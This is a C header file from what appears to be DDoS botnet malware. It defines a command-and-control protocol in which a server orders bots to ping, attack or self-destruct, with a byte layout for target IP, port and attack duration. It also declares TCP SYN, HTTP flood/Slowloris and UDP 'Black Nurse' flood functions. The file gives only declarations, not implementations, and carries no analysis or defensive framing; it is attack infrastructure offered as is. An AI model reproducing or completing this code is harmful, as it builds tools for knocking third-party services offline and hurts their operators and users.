#pragma once

#include <stdint.h>

enum command_type
{
    PING = 1 << 0,  // C2 check if bot is alive
    HELLO = 1 << 1, // C2 send this when connection begin
    ATTACK_TCP = 1 << 2,  //
    ATTACK_UDP = 1 << 3,  //
    ATTACK_HTTP = 1 << 4, //
    EXIT = 1 << 5, // self-destroy bot

    HAS_NO_ARGS = PING | HELLO | EXIT // commands with no args
};

/**
 *   [Server -> Bot]
 *     | BYTE |    DATA     |
 *     |------|-------------|
 *     | 00   | command_type|
 *     | 01   | duration    |
 *     | 02   | target o1   |
 *     | 03   | target o2   |
 *     | 04   | target o3   |
 *     | 05   | target o4   |
 *     | 06   | port low    |
 *     | 07   | port high   |
 *     | 08   | 0x0A (end)  |
 *   [Bot -> Server]
 *     ...
 */

struct target_ip
{
    uint8_t o1;
    uint8_t o2;
    uint8_t o3;
    uint8_t o4;
};

struct command
{
    enum command_type type;
    struct
    {
        uint8_t duration; // Valid for ATTACK_* flags
        struct target_ip target;
        uint16_t port;
    } data;
};



#ifdef DEBUG
extern const char *__command_type_strings[];
#endif

uint8_t parse_command_from_buffer(uint8_t []);


//Attack inits

/* TCP ESSYNC Attack */
void atk_start_tcp_essyn(char *target_ip, int target_port, int duration);

/* HTTP Flood / Slowris (Evasion Technology) attack */
void start_httplankton_attack(char *target_ip, int target_port, int duration);

/* UDP Black Nurse variant L4 attack */
void start_blue_nurse_flood(char *host, int seconds, int psize, int forks);